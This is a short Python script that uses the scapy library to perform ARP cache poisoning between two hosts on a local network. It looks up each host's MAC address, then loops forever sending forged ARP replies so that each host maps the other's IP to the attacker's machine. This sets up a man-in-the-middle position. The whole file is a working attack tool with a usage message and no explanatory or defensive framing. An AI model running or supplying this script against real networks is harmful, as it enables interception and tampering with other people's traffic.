#!/usr/bin/python3

import sys
import time
from scapy.all import sendp, ARP, Ether, srp

EthBroadcastAddress = "ff:ff:ff:ff:ff:ff"
ArpResponseCode = 2

def getMac(_interfaceName, _protocolDst):
    broadcastFrame = Ether(dst=EthBroadcastAddress)
    arpRequest = ARP(pdst=_protocolDst)
    arpFrame = broadcastFrame / arpRequest
    answerList = srp(arpFrame, iface=_interfaceName, timeout=5, verbose=False)[0]
    return answerList[0][1].hwsrc

def sendFalseArpResponse(_interfaceName, _protocolDst, _hardwareDst, _falseProtocolSrc):
    frame = Ether() / ARP(op=ArpResponseCode, pdst=_protocolDst, hwdst=_hardwareDst, psrc=_falseProtocolSrc)
    sendp(frame, iface=_interfaceName, verbose=False)    

if len(sys.argv) < 4:
    print(sys.argv[0] + ": <interface name> <side A IP address> <side B IP address>")
    sys.exit(1)

interfaceName = sys.argv[1]
sideAIp = sys.argv[2]
sideBIp = sys.argv[3]

sideAMac = getMac(interfaceName, sideAIp)
sideBMac = getMac(interfaceName, sideBIp)

while True:
    sendFalseArpResponse(interfaceName, sideAIp, sideAMac, sideBIp)
    sendFalseArpResponse(interfaceName, sideBIp, sideBMac, sideAIp)
    time.sleep(5)
